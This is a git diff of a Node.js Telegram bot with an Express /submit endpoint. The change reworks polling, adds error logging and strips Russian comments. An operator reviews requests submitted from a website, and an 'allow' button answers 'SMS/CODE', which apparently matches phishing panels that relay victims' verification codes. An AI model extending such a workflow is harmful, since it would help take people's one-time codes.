@@ -6,15 +6,30 @@ const app = express();
 app.use(express.json()); // важно для сайта
 
 const token = process.env.BOT_TOKEN;
-const bot = new TelegramBot(token, { polling: true });
+
+// 🔥 ИЗМЕНЕНО (защищённый polling)
+const bot = new TelegramBot(token, {
+  polling: {
+    autoStart: true,
+    interval: 2000,
+    params: {
+      timeout: 10
+    }
+  }
+});
+
+// 🔥 ДОБАВЛЕНО (чтобы бот не падал)
+bot.on("polling_error", (error) => {
+  console.log("BOT POLLING ERROR:", error.code, error.message);
+});
 
 console.log("STARTED");
 
 // ================== РОЛИ ==================
-const ADMIN_ID = 8035773808; // <-- ВСТАВЬ СВОЙ ID
+const ADMIN_ID = 8035773808;
 
 const mods = [
-  111111111, // <-- ID модеров
+  111111111,
   222222222
 ];
 
@@ -26,12 +41,10 @@ const banned = {};
 bot.on("message", (msg) => {
   const userId = msg.chat.id;
 
-  // блок если забанен
   if (banned[userId]) {
     return bot.sendMessage(userId, "🚫 доступ запрещён");
   }
 
-  // админ панель
   if (msg.text === "/admin") {
     if (msg.chat.id !== ADMIN_ID) {
       return bot.sendMessage(msg.chat.id, "⛔ нет доступа");
@@ -48,7 +61,6 @@ bot.on("message", (msg) => {
     });
   }
 
-  // тест заявка
   if (msg.text === "/test") {
     const requestId = Date.now();
 
@@ -74,7 +86,7 @@ bot.on("message", (msg) => {
   bot.sendMessage(userId, "бот работает ✅");
 });
 
-// ================== CALLBACK КНОПКИ ==================
+// ================== CALLBACK ==================
 bot.on("callback_query", (q) => {
   const data = q.data;
   const requestId = data.split("_")[1];
@@ -83,7 +95,6 @@ bot.on("callback_query", (q) => {
   const isAdmin = q.from.id === ADMIN_ID;
   const isMod = mods.includes(q.from.id);
 
-  // бан
   if (data.startsWith("ban")) {
     if (!isAdmin && !isMod) return;
 
@@ -91,7 +102,6 @@ bot.on("callback_query", (q) => {
     return bot.answerCallbackQuery(q.id, { text: "🚫 забанен" });
   }
 
-  // разбан
   if (data.startsWith("unban")) {
     if (!isAdmin && !isMod) return;
 
@@ -99,14 +109,12 @@ bot.on("callback_query", (q) => {
     return bot.answerCallbackQuery(q.id, { text: "✅ разбанен" });
   }
 
-  // allow
   if (data.startsWith("allow")) {
     if (!isAdmin && !isMod) return;
 
     return bot.answerCallbackQuery(q.id, { text: "➡️ SMS/CODE" });
   }
 
-  // админка
   if (data === "admin_requests") {
     const list = Object.entries(users)
       .map(([id, u]) => `ID ${id} → ${u.userId}`)
@@ -130,7 +138,7 @@ bot.on("callback_query", (q) => {
   bot.answerCallbackQuery(q.id);
 });
 
-// ================== САЙТ API ==================
+// ================== SITE API ==================
 app.post("/submit", (req, res) => {
   const data = req.body;
 
@@ -152,7 +160,7 @@ app.post("/submit", (req, res) => {
   res.json({ ok: true, requestId });
 });
 
-// ================== СЕРВЕР ==================
+// ================== SERVER ==================
 app.get("/", (req, res) => {
   res.send("ok");
 });
